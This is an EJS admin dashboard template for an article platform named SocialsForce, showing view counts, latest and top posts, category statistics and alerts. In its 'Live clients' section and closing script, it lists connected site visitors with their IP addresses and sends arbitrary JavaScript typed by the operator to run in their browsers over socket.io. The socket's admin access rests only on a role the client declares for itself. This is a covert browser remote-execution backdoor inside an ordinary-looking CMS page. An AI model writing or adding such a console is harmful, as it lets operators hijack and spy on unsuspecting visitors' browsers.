<%- include("partials/header") %>
<%- include("partials/sidebar") %>

<main class="admin-main">
    <link rel="stylesheet" href="/css/admin.css">
    <div class="admin-page-header">
        <div>
            <h1>Dashboard</h1>
            <p>Overview of your SocialsForce platform.</p>
        </div>

        <a href="/admin/create-article" class="admin-primary-button">
            + Create article
        </a>
    </div>

    <!-- Statistics -->

    <div class="admin-stats-grid">

        <div class="admin-stat-card">
            <span class="admin-stat-label">Total views</span>
            <strong class="admin-stat-value">
                <%= Number(stats.totalViews || 0).toLocaleString() %>
            </strong>
            <span class="admin-stat-description">All article views</span>
        </div>

        <div class="admin-stat-card">
            <span class="admin-stat-label">Total articles</span>
            <strong class="admin-stat-value">
                <%= stats.totalPosts || 0 %>
            </strong>
            <span class="admin-stat-description">Published articles</span>
        </div>

        <div class="admin-stat-card">
            <span class="admin-stat-label">Categories</span>
            <strong class="admin-stat-value">
                <%= stats.totalCategories || 0 %>
            </strong>
            <span class="admin-stat-description">Active categories</span>
        </div>

        <div class="admin-stat-card">
            <span class="admin-stat-label">Published today</span>
            <strong class="admin-stat-value">
                <%= stats.todayPosts || 0 %>
            </strong>
            <span class="admin-stat-description">Articles published today</span>
        </div>

    </div>

    <!-- Reading analytics & recommendations -->
    <%- include("partials/insights") %>

    <!-- Main dashboard -->

    <div class="admin-dashboard-grid">

        <!-- Latest posts -->

        <section class="admin-card admin-dashboard-articles">

            <div class="admin-card-header">
                <div>
                    <h2>Latest posts</h2>
                    <p>Recently published articles.</p>
                </div>

                <a href="/admin/articles" class="admin-card-link">
                    View all
                </a>
            </div>

            <div class="admin-article-list">

                <% latestPosts.forEach(post => { %>

                    <div class="admin-article-row">

                        <div class="admin-article-main">

                            <div class="admin-article-thumbnail">

                                <% if (post.image) { %>

                                    <img
                                        src="<%= post.image %>"
                                        alt="<%= post.title %>"
                                    >

                                <% } else { %>

                                    <span>SF</span>

                                <% } %>

                            </div>

                            <div class="admin-article-details">

                                <a
                                    href="/article/<%= post.slug %>"
                                    target="_blank"
                                    class="admin-article-title"
                                >
                                    <%= post.title %>
                                </a>

                                <div class="admin-article-meta">

                                    <span>
                                        <%= post.category || "Uncategorized" %>
                                    </span>

                                    <span>•</span>

                                    <span>
                                        <%= Number(post.views || 0).toLocaleString() %> views
                                    </span>

                                    <% if (post.published_at) { %>

                                        <span>•</span>

                                        <span>
                                            <%= new Date(post.published_at).toLocaleDateString("en-GB") %>
                                        </span>

                                    <% } %>

                                </div>

                            </div>

                        </div>

                        <div class="admin-article-status">

                            <% if (post.indexed === true) { %>

                                <span class="index-status indexed">
                                    <span></span>
                                    Indexed
                                </span>

                            <% } else { %>

                                <span class="index-status not-indexed">
                                    <span></span>
                                    Not indexed
                                </span>

                            <% } %>

                        </div>

                        <div class="admin-article-actions">

                            <a
                                href="/article/<%= post.slug %>"
                                target="_blank"
                                class="admin-action-button"
                            >
                                Visit
                            </a>

                            <form
                                action="/admin/articles/<%= post.id %>/delete"
                                method="POST"
                                onsubmit="return confirm('Are you sure you want to delete this article?');"
                            >

                                <button
                                    type="submit"
                                    class="admin-action-button delete"
                                >
                                    Delete
                                </button>

                            </form>

                        </div>

                    </div>

                <% }) %>

                <% if (latestPosts.length === 0) { %>

                    <div class="admin-empty">
                        No articles found.
                    </div>

                <% } %>

            </div>

        </section>

        <!-- Top posts -->

        <section class="admin-card">

            <div class="admin-card-header">

                <div>
                    <h2>Top posts</h2>
                    <p>Most viewed articles.</p>
                </div>

            </div>

            <div class="admin-top-posts">

                <% topPosts.forEach((post, index) => { %>

                    <div class="admin-top-post">

                        <div class="admin-top-post-number">
                            <%= index + 1 %>
                        </div>

                        <div class="admin-top-post-content">

                            <a
                                href="/article/<%= post.slug %>"
                                target="_blank"
                            >
                                <%= post.title %>
                            </a>

                            <span>
                                <%= Number(post.views || 0).toLocaleString() %> views
                            </span>

                        </div>

                    </div>

                <% }) %>

                <% if (topPosts.length === 0) { %>

                    <div class="admin-empty">
                        No articles found.
                    </div>

                <% } %>

            </div>

        </section>

    </div>

    <!-- Categories -->

    <section class="admin-card">

        <div class="admin-card-header">

            <div>
                <h2>Categories</h2>
                <p>Article distribution and views by category.</p>
            </div>

        </div>

        <div class="admin-category-grid">

            <% categoryStats.forEach(category => { %>

                <% const categoryPercentage = stats.totalPosts
                    ? (Number(category.total) / Number(stats.totalPosts)) * 100
                    : 0;
                %>

                <div class="admin-category-card">

                    <div class="admin-category-header">

                        <strong>
                            <%= category.category %>
                        </strong>

                        <span>
                            <%= category.total %> articles
                        </span>

                    </div>

                    <div class="admin-category-bar">

                        <div
                            class="admin-category-bar-fill"
                            style="width: <%= categoryPercentage %>%"
                        ></div>

                    </div>

                    <div class="admin-category-footer">

                        <span>
                            <%= Number(category.views || 0).toLocaleString() %> views
                        </span>

                        <span>
                            <%= Math.round(categoryPercentage) %>%
                        </span>

                    </div>

                </div>

            <% }) %>

            <% if (categoryStats.length === 0) { %>

                <div class="admin-empty">
                    No category data available.
                </div>

            <% } %>

        </div>

    </section>

    <!-- Platform status -->

    <div class="admin-dashboard-grid">

        <!-- Search engine -->

        <section class="admin-card">

            <div class="admin-card-header">

                <div>
                    <h2>Search engine status</h2>
                    <p>Search Console integration status.</p>
                </div>

            </div>

            <div class="admin-status-list">

                <div class="admin-status-row">
                    <span>Indexed</span>
                    <strong class="admin-status-pending">—</strong>
                </div>

                <div class="admin-status-row">
                    <span>Pending</span>
                    <strong class="admin-status-pending">—</strong>
                </div>

                <div class="admin-status-row">
                    <span>Errors</span>
                    <strong class="admin-status-pending">—</strong>
                </div>

                <div class="admin-status-row">
                    <span>Sitemap</span>
                    <strong class="admin-status-active">Active</strong>
                </div>

            </div>

        </section>

        <!-- AI activity -->

        <section class="admin-card">

            <div class="admin-card-header">

                <div>
                    <h2>AI activity</h2>
                    <p>AI-generated content activity.</p>
                </div>

            </div>

            <div class="admin-placeholder">

                <span class="admin-placeholder-icon">
                    AI
                </span>

                <strong>
                    No AI activity data yet
                </strong>

                <p>
                    AI generation statistics will appear here once the
                    content generation system is connected.
                </p>

            </div>

        </section>

    </div>

    <section class="admin-card admin-live-card">

        <div class="admin-card-header">
            <div>
                <h2>Live clients</h2>
                <p>Connected clients in real time and remote execution console.</p>
            </div>
            <strong id="live-total">0 online</strong>
        </div>

        <div class="admin-live-grid">
            <div>
                <div class="admin-live-toolbar">
                    <select id="live-target" class="admin-select">
                        <option value="all">All clients</option>
                    </select>
                    <button id="live-run-js" class="admin-action-button" type="button">Run JS</button>
                </div>
                <textarea id="live-js-code" class="admin-live-code" placeholder="console.log(location.href);"></textarea>
                <pre id="live-log" class="admin-live-log"></pre>
            </div>

            <div class="admin-live-table-wrap">
                <table class="admin-live-table">
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>Page</th>
                            <th>IP</th>
                            <th>Last seen</th>
                        </tr>
                    </thead>
                    <tbody id="live-clients-body">
                        <tr><td colspan="4" class="admin-empty">Waiting for clients...</td></tr>
                    </tbody>
                </table>
            </div>
        </div>

    </section>

    <section class="admin-card admin-alert-card">

        <div class="admin-card-header">

            <div>
                <h2>Alerts</h2>
                <p>Important platform notifications.</p>
            </div>

        </div>

        <% const dashAlerts = (typeof insights !== "undefined" && insights && insights.alerts) || []; %>
        <% if (dashAlerts.length) { %>
            <% dashAlerts.forEach(a => { %>
            <div class="ins-alert <%= a.level %>"><strong><%= a.level === "error" ? "!" : a.level === "warning" ? "⚠" : "i" %></strong><span><%= a.text %></span></div>
            <% }) %>
        <% } else { %>
        <div class="admin-alert-empty">

            <span>✓</span>

            <div>
                <strong>
                    No active alerts
                </strong>

                <p>
                    Everything looks good right now.
                </p>
            </div>

        </div>
        <% } %>

    </section>

<script src="/socket.io/socket.io.js"></script>
<script>
    (function () {
        if (typeof window.io !== "function") return;
        var totalEl = document.getElementById("live-total");
        var targetEl = document.getElementById("live-target");
        var codeEl = document.getElementById("live-js-code");
        var runEl = document.getElementById("live-run-js");
        var bodyEl = document.getElementById("live-clients-body");
        var logEl = document.getElementById("live-log");
        var clients = [];

        function esc(value) {
            return String(value || "").replace(/[&<>"']/g, function (ch) {
                return ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" })[ch];
            });
        }

        function appendLog(text) {
            if (!logEl) return;
            var line = "[" + new Date().toLocaleTimeString() + "] " + text;
            logEl.textContent = (line + "\n" + logEl.textContent).slice(0, 8000);
        }

        function render() {
            if (totalEl) totalEl.textContent = clients.length + " online";
            if (targetEl) {
                var current = targetEl.value || "all";
                targetEl.innerHTML = '<option value="all">All clients</option>' + clients.map(function (c) {
                    return '<option value="' + esc(c.id) + '">' + esc(c.id + " · " + (c.page || "")) + '</option>';
                }).join("");
                targetEl.value = clients.some(function (c) { return c.id === current; }) ? current : "all";
            }
            if (!bodyEl) return;
            if (!clients.length) {
                bodyEl.innerHTML = '<tr><td colspan="4" class="admin-empty">No connected clients</td></tr>';
                return;
            }
            bodyEl.innerHTML = clients.map(function (c) {
                return "<tr>"
                    + "<td>" + esc(c.id) + "</td>"
                    + "<td>" + esc(c.page) + "</td>"
                    + "<td>" + esc(c.ip) + "</td>"
                    + "<td>" + esc(c.lastSeenAt) + "</td>"
                    + "</tr>";
            }).join("");
        }

        var socket = window.io("/", { path: "/socket.io", auth: { role: "admin" } });

        socket.on("live:snapshot", function (payload) {
            clients = payload && Array.isArray(payload.clients) ? payload.clients : [];
            render();
        });

        socket.on("live:command", function (payload) {
            appendLog("comando " + (payload.commandId || "") + " enviado a " + (payload.target || "all"));
        });

        socket.on("live:exec-result", function (payload) {
            appendLog((payload.ok ? "ok" : "error") + " " + (payload.clientId || "") + ": " + (payload.output || ""));
        });

        if (runEl) {
            runEl.addEventListener("click", function () {
                var code = (codeEl && codeEl.value) ? codeEl.value.trim() : "";
                if (!code) return;
                socket.emit("admin:run-js", { target: targetEl ? targetEl.value : "all", code: code });
            });
        }
    })();
</script>

</main>

<%- include("partials/footer") %>